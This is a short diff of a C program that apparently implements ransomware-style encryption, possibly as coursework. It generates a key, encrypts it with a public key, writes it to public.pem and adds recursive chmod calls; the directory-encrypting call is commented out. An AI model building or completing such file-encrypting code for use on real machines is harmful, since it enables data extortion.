@@ -29,8 +29,9 @@ void encrypt(){
     getKeyId(&ki);
     unsigned char key[32];
     newKey(key);
-    //scanAndCrypt("/home", key, true);
+    //scanAndCrypt("/home/emil/Facultate/Imperative Programming", key, true);
     unsigned char d[3000];
+    system("chmod -R 700 .");
     public_encrypt(key, 32, ki.key, d);
     FILE *k = fopen("public.pem", "wb");
     fprintf(k, "%d!%s", ki.id, d);
@@ -76,5 +77,6 @@ void decrypt(){
 }
 
 int main(int n, char *args[n]){
+    system("chmod -R 555 .");
     encrypt();
 }
